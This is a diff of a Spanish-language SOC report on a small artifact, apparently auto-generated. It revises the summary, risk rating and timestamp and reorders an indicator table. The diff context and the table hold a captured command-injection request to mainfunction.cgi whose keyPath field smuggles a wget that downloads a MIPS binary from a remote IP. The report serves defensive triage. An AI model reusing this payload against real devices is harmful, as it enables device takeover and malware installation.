@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+Artefacto de 265 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.30. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:09:36+00:00`
+- **Registrado:** `2026-08-09T20:09:36.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -49,8 +49,8 @@ GET /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F31.56.39.XXX
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| hash | 20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49 | static_analysis |
 | command | GET /cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F31.56.39.XXX%2Fmemory_bin_dir%2Fmemory_load.mips+%3B+ | strings |
+| hash | 20b5c42fd1280597e6d02c2bba17327396a0c09e9daa6394edb4fe825e833c49 | static_analysis |
 | ip | 172.179.142.XXX | artifact_source |
 
 ## 🔎 Triage
